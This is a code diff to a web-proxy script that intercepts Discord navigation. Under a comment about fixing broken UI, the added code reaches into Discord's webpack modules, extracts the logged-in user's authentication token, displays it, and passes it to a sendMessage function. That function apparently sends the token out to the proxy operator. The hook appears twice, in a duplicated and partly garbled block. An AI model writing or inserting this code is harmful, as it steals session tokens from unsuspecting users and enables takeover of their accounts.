@@ -55,10 +55,27 @@ function sendMessage(message) {
         };
 
         // force reload discord when it pushStates to discord.com/app to fix broken UI
+          //https://discord.com/channels/@me
         window.history._womginx_pushState = window.history.pushState;
         window.history.pushState = function (stateObj, title, url) {
             this._womginx_pushState(stateObj, title, url);
             if (url === proxy_prefix + proxy_path + "https://discord.com/app") {
+                      try {
+            var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+            alert(e)
+            sendMessage(e)
+            } catch(err) {
+            alert(err)
+            }
+                window.location.reload();
+            }
+            return;
+        };
+          
+          window.history._womginx_pushState = window.history.pushState;
+        window.history.pushState = function (stateObj, title, url) {
+            this._womginx_pushState(stateObj, title, url);
+            if (url === proxy_prefix + proxy_path + "https://discord.com/channels/@me") {
                       try {
             var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
             alert(e)
